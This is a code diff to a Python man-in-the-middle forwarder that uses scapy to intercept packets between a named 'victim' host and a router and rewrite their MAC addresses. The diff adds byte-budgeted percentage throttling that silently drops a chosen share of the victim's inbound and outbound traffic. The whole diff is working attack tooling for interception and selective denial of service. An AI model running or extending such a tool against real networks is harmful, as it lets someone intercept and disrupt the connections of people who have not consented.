@@ -17,11 +17,15 @@ class MitmForwarder:
         self.my_mac = None
         self.drop_from_victim = False
         self.drop_to_victim = False
+        self.pass_from_victim_pct = 100
+        self.pass_to_victim_pct = 100
         self._pkt_count = 0
         self._drop_count = 0
         self._fwd_count = 0
         self._debug = debug
         self._socket = None  # Persistent L2 socket
+        self._byte_budget_from_victim = 0.0
+        self._byte_budget_to_victim = 0.0
 
     def start(
         self,
@@ -32,6 +36,8 @@ class MitmForwarder:
         should_drop=None,
         drop_from_victim: bool = False,
         drop_to_victim: bool = False,
+        pass_from_victim_pct: int = 100,
+        pass_to_victim_pct: int = 100,
     ):
         """
         Start capturing traffic for victim/router and rewrite MACs before sending.
@@ -43,6 +49,10 @@ class MitmForwarder:
         self.my_mac = iface_mac
         self.drop_from_victim = drop_from_victim
         self.drop_to_victim = drop_to_victim
+        self.pass_from_victim_pct = max(0, min(100, int(pass_from_victim_pct)))
+        self.pass_to_victim_pct = max(0, min(100, int(pass_to_victim_pct)))
+        self._byte_budget_from_victim = 0.0
+        self._byte_budget_to_victim = 0.0
         self.running = True
 
         if not (self.victim.get('ip') and self.victim.get('mac')):
@@ -70,6 +80,10 @@ class MitmForwarder:
             print(f"[forwarder] victim={self.victim['ip']}/{self.victim['mac']}")
             print(f"[forwarder] router={self.router['ip']}/{self.router['mac']}")
             print(f"[forwarder] drop_from_victim={self.drop_from_victim}, drop_to_victim={self.drop_to_victim}")
+            print(
+                "[forwarder] pass_from_victim_pct=%s, pass_to_victim_pct=%s"
+                % (self.pass_from_victim_pct, self.pass_to_victim_pct)
+            )
         try:
             self.sniffer = AsyncSniffer(
                 iface=self.iface,
@@ -111,7 +125,29 @@ class MitmForwarder:
             'packets_forwarded': self._fwd_count,
             'drop_from_victim': self.drop_from_victim,
             'drop_to_victim': self.drop_to_victim,
+            'pass_from_victim_pct': self.pass_from_victim_pct,
+            'pass_to_victim_pct': self.pass_to_victim_pct,
         }
+
+    def _passes_ratio(self, pass_pct: int, direction: str, pkt_size: int) -> bool:
+        pct = max(0, min(100, int(pass_pct)))
+        if pct <= 0:
+            return False
+        if pct >= 100:
+            return True
+        size = max(1, int(pkt_size))
+        grant = (size * pct) / 100.0
+        if direction == 'out':
+            self._byte_budget_from_victim += grant
+            if self._byte_budget_from_victim >= size:
+                self._byte_budget_from_victim -= size
+                return True
+            return False
+        self._byte_budget_to_victim += grant
+        if self._byte_budget_to_victim >= size:
+            self._byte_budget_to_victim -= size
+            return True
+        return False
 
     def _process_packet(self, pkt):
         if not self.running or not pkt.haslayer(IP) or not pkt.haslayer(Ether):
@@ -133,6 +169,9 @@ class MitmForwarder:
                 if self._debug and self._drop_count <= 3:
                     print(f"[forwarder] DROPPING outbound: {src} -> {dst}")
                 return  # packet dies here
+            if not self._passes_ratio(self.pass_from_victim_pct, 'out', self._packet_size_bytes(pkt)):
+                self._drop_count += 1
+                return
             pkt[Ether].src = self.my_mac
             pkt[Ether].dst = self.router['mac']
             self._fix_checksums(pkt)
@@ -145,6 +184,9 @@ class MitmForwarder:
                 self._drop_count += 1
                 if self._debug and self._drop_count <= 3:
                     print(f"[forwarder] DROPPING inbound: {src} -> {dst}")
+                return
+            if not self._passes_ratio(self.pass_to_victim_pct, 'in', self._packet_size_bytes(pkt)):
+                self._drop_count += 1
                 return
             pkt[Ether].src = self.my_mac
             pkt[Ether].dst = self.victim['mac']
@@ -182,3 +224,14 @@ class MitmForwarder:
                 del pkt['UDP'].chksum
         except Exception:
             pass
+
+    @staticmethod
+    def _packet_size_bytes(pkt) -> int:
+        """Best-effort packet size for byte-aware pass-through gating."""
+        try:
+            return len(bytes(pkt))
+        except Exception:
+            try:
+                return len(pkt)
+            except Exception:
+                return 1
